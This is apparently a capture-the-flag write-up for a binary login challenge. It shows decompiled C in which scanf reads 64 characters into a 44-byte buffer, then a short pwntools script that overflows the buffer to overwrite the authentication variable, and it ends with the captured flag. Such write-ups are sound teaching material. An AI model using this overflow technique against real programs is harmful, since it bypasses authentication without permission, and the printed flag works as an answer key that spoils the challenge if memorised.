---
ai_date: 2025-04-27 05:25:32
ai_summary: Overflow exploit using buffer overflow in scanf input for 'password'
ai_tags:
  - buffer-overflow
  - overflow
  - x86
created: 2025-03-01T22:17
points: 100
solves: 16
updated: 2025-07-14T09:46
---

Well, `passw0rd` didn't work.

But... if we look closely, `s1` has length of 44 while `scanf` takes in 64 characters.

We can overflow it.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s1[44]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+2Ch] [rbp-4h]

  puts(">>        * * * Login * * *        <<");
  v5 = 0;
  printf("Enter the password: ");
  __isoc99_scanf("%64[^\n]", s1);
  if ( !strcmp(s1, "passw0rd") )
    v5 = 1;
  if ( v5 )
  {
    puts("The password is right!");
    sub_4011F6();
  }
  else
  {
    puts("Wrong password.");
  }
  puts(">>        * * *  Bye  * * *        <<");
  return 0LL;
}
```

```python
# http://127.0.0.1:57254/
from pwn import *
r = remote('127.0.0.1', 57254)
payload = b"A" * 44
payload += p32(1)
r.sendlineafter(b'Enter the password: ', payload)
r.interactive()
```

```flag
ATHACKCTF{seee_d0uble_y0u_eee_0ne_twenty}
```